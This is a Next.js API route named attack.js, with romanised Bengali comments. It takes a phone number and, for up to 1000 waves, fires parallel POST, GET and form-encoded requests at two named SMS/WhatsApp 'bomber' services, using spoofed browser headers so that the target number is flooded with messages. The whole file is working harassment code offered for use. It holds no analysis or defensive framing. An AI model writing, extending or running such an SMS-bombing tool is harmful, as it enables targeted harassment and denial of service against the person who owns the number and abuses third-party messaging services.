// pages/api/attack.js

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).send('Method not allowed');

  let { number, amount, isUltimate } = req.body;

  // 1. Number Cleaning (Strictly 11 digits)
  let cleanNumber = number.toString().replace(/\D/g, ''); 
  if (cleanNumber.startsWith('88')) cleanNumber = cleanNumber.substring(2);
  if (cleanNumber.length > 11) cleanNumber = cleanNumber.substring(0, 11);

  const targetLinks = [
    'https://nuke-sms-bomber.pages.dev/',
    'https://shadowx-sms-bomber.onrender.com/'
  ];

  const runAttack = async () => {
    // Ultimate mode e 1000+ attack simulation
    const totalWaves = isUltimate ? 1000 : amount; 
    const delay = isUltimate ? 300 : 1000; 

    for (let i = 0; i < totalWaves; i++) {
      // Protibar loop e amra multiple methods try korbo
      const attackPromises = targetLinks.map(async (baseUrl) => {
        
        // --- METHOD 1: POST with Massive Payload (JSON) ---
        const postPayload = async () => {
          try {
            await fetch(baseUrl, {
              method: 'POST',
              headers: { 
                'Content-Type': 'application/json',
                'Accept': 'application/json, text/plain, */*',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
                'X-Requested-With': 'XMLHttpRequest',
                'Origin': baseUrl,
                'Referer': baseUrl,
              },
              body: JSON.stringify({
                number: cleanNumber,
                phone: cleanNumber,
                target: cleanNumber,
                amount: 1,
                count: 1,
                country: "BD",
                service: "whatsapp",
                msg: "Ultimate Attack",
                auth: "true",
                token: Math.random().toString(36).substring(7),
                is_active: true
              }),
              mode: 'no-cors'
            });
          } catch (e) {}
        };

        // --- METHOD 2: GET with Query Parameters (URL Injection) ---
        const getPayload = async () => {
          const urlWithParams = `${baseUrl}?number=${cleanNumber}&amount=1&country=BD&service=whatsapp&phone=${cleanNumber}&target=${cleanNumber}`;
          try {
            await fetch(urlWithParams, {
              method: 'GET',
              mode: 'no-cors',
              headers: {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
              }
            });
          } catch (e) {}
        };

        // --- METHOD 3: Form Data Simulation (X-WWW-FORM-URLENCODED) ---
        const formDataPayload = async () => {
          try {
            const formData = new URLSearchParams();
            formData.append('number', cleanNumber);
            formData.append('amount', '1');
            formData.append('country', 'BD');

            await fetch(baseUrl, {
              method: 'POST',
              headers: { 
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
              },
              body: formData.toString(),
              mode: 'no-cors'
            });
          } catch (e) {}
        };

        // Ekhon amra sob method eksathe execute korbo (Parallel Attack)
        return Promise.all([postPayload(), getPayload(), formDataPayload()]);

      });

      await Promise.all(attackPromises);
      await new Promise(resolve => setTimeout(resolve, delay));
    }
  };

  runAttack();

  return res.status(200).json({ 
    success: true, 
    message: isUltimate ? "ULTIMATE ATTACK INITIATED! 🚀" : "ATTACK STARTED! 🔥" 
  });
                }
